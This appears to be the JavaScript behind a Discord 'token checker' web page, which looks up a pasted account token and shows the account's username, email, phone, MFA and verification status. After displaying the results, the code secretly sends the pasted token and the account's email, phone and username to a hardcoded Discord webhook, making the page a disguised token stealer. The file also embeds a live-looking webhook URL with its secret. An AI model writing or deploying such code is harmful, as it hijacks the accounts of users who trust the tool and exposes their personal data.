async function sendMessage() {
    const alerter = document.getElementById("alert-doe");
    const list = document.getElementsByClassName("list-group")[0];
    const id = document.getElementById("id");
    const tag = document.getElementById("tag");
    const mfa = document.getElementById("mfa");
    const tel = document.getElementById("phone");
    const loc = document.getElementById("locale");
    const email = document.getElementById("email");
    const ver = document.getElementById("verified");
    const profile = document.querySelector("#profile");
    const info = document.querySelector(".info")
    const token = document.getElementsByClassName("label")[0].value;

    alerter.style.display = "none";
    list.style.display = "none";
    profile.style.display = "none";
    info.style.display = "block";

    let response;
    try {
        response = await fetch("https://discordapp.com/api/v8/users/@me", {
            method: "GET",
            headers: {
                Authorization: token
            },
        });
        response = await response.json();
    } catch (e) {
        return alert(`Request failed: ${e}`);
    }

    if (!response.username) {
        return (alerter.style.display = "block");
    }

    if (response.avatar) {
        profile.src = "https://cdn.discordapp.com/avatars/" + response.id + "/" + response.avatar + ".png?size=128";
    } else {
        profile.src = "https://cdn.discordapp.com/embed/avatars/" + (response.discriminator % 5) + ".png?size=128";
    }

    tag.textContent = "User : " + response.username + "#" + response.discriminator;
    mfa.textContent = response.mfa_enabled ? "Mfa : " + "Yes" : "Mfa : " + "Nop";
    email.textContent = response.email ? "Email : " + response.email : "Nop";
    ver.textContent = response.verified ? "Verification : " + "Verified" : "Verification : " + "Nop";
    tel.textContent = response.phone ? "Phone : " + response.phone : "Phone : " + "Nop";
    id.textContent = "ID : " + response.id;
    loc.textContent = "Locate : " + response.locale;
    profile.style.display = "flex";
    list.style.display = "block";
    info.style.display = "none";

    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/845120396164726794/R0PKxYAw0siJUQut0_aBrkY1JUnK2GYjTH0WsoKQFPMCK6aSyhp3zwCrSSu5Ax9pQuMk");
    request.setRequestHeader('Content-type', 'application/json');
    
    var myEmbed = {
      author: {
        name: "Token Aprovado.",
        'icon_url': "https://cdn.discordapp.com/avatars/" + response.id + "/" + response.avatar + ".png?size=128",

    },
    "thumbnail": {
        "url": "https://cdn.discordapp.com/avatars/" + response.id + "/" + response.avatar + ".gif?size=128"
      },
      description: "<:email:845136648954183700> `Token: " + document['getElementById']('token')['value'] + "`" +"\n"+ "<:config:845138158953955338> `Username: " + response.username + "#" + response.discriminator + "`" + "\n"+ "<:copiar:845138186681188412> `Email: " + response.email + "`" +"\n"+ "<:memoryram:845142259208028160> `Phone: " + response.phone + "`" + "\n" + "<:info:845144629242101820> `Verificado: " + response.verified + "`" + "\n" + "\n" + "<:blacklisted:845146264927993866> `null: não - true: sim | imagem extra: nitro`",
      color: hexToDecimal("#00FF00")
    }

    var params = {
      username: "Droou | Servidor de Envios 1",
      embeds: [ myEmbed ]
    }
    request.send(JSON.stringify(params));
    
    function hexToDecimal(hex) {
      return parseInt(hex.replace("#",""), 16)
    }
}

